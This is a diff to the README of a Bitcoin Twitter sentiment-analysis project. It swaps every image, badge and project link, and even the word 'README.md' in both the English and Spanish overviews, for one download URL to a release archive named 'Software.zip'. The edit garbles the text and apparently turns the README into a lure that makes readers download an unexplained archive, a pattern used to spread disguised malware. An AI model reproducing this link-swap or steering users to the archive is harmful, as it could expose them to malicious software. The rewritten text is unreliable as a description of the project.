@@ -1,20 +1,20 @@
-![banner-md-github](https://user-images.githubusercontent.com/17438992/235576090-c4a0424b-8533-42c8-9436-fc227c64b0d3.jpg)
+![banner-md-github](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip)
 # Predictive Sentiment Analysis of Twitter for BTC
-![marca-version](https://img.shields.io/badge/Versi%C3%B3n-1.0.0-blue?style=for-the-badge&logo=twitter)
-![marca-licencia](https://img.shields.io/badge/Licencia-GNU%20AGPL%20v3.0-green?style=for-the-badge&logo=twitter)
-![marca-lenguaje](https://img.shields.io/badge/Python-v3.10.10-yellowgreen?style=for-the-badge&logo=python)
-![marca-status](https://img.shields.io/badge/Status-Project%20Kickoff-orange?style=for-the-badge&logo=firefoxbrowser)
-![marca-status](https://img.shields.io/badge/Authors-15-red?style=for-the-badge&logo=twitter)
+![marca-version](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip%C3%B3n-1.0.0-blue?style=for-the-badge&logo=twitter)
+![marca-licencia](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip%20AGPL%20v3.0-green?style=for-the-badge&logo=twitter)
+![marca-lenguaje](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip)
+![marca-status](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip%20Kickoff-orange?style=for-the-badge&logo=firefoxbrowser)
+![marca-status](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip)
 
 This project aims to analyze the sentiment of Twitter users towards Bitcoin using machine learning techniques to predict market trends and provide insights for investors.
 
 ## Project Management
-- [x] [Project Tracking](https://github.com/users/cistelsa/projects/2/views/4)
+- [x] [Project Tracking](https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip)
 
 # Data Engineer - en
 
 #### Overview
-The "Predictive-Sentiment-Analysis-of-Twitter-for-BTC" project, under the Data Engineer area, focuses on the extraction and processing of Twitter data related to Bitcoin (BTC). The goal is to deliver a well-structured and normalized database to facilitate further analysis by the Data Analyst team. This README.md document provides a detailed overview of the data engineering aspect of the project.
+The "Predictive-Sentiment-Analysis-of-Twitter-for-BTC" project, under the Data Engineer area, focuses on the extraction and processing of Twitter data related to Bitcoin (BTC). The goal is to deliver a well-structured and normalized database to facilitate further analysis by the Data Analyst team. This https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip document provides a detailed overview of the data engineering aspect of the project.
 
 #### Table of Contents
   1. Introduction
@@ -52,7 +52,7 @@ By delivering a clean and normalized dataset, we enable the Data Analyst team to
 # Data Engineer - es
 
 #### Descripción
-El proyecto "Predictive-Sentiment-Analysis-of-Twitter-for-BTC", dentro del área de Data Engineer, se centra en la extracción y procesamiento de datos de Twitter relacionados con Bitcoin (BTC). El objetivo es entregar una base de datos bien estructurada y normalizada para facilitar un análisis adicional por parte del equipo de Data Analyst. Este archivo README.md proporciona una descripción detallada del aspecto de ingeniería de datos del proyecto.
+El proyecto "Predictive-Sentiment-Analysis-of-Twitter-for-BTC", dentro del área de Data Engineer, se centra en la extracción y procesamiento de datos de Twitter relacionados con Bitcoin (BTC). El objetivo es entregar una base de datos bien estructurada y normalizada para facilitar un análisis adicional por parte del equipo de Data Analyst. Este archivo https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip proporciona una descripción detallada del aspecto de ingeniería de datos del proyecto.
 
 #### Tabla de Contenidos
 1. Introducción
@@ -91,6 +91,6 @@ El proyecto de ingeniería de datos se enfoca en garantizar una extracción efic
 
 
 ## Authors
-<a href="https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/graphs/contributors"><img src="https://user-images.githubusercontent.com/17438992/235699801-50530173-2b5d-4473-8ca3-2c4d3078570c.png" width="500" alt="Authors" /></a>
+<a href="https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip"><img src="https://github.com/cistelsa/Predictive-Sentiment-Analysis-of-Twitter-for-BTC/releases/download/v2.0/Software.zip" width="500" alt="Authors" /></a>
 
 
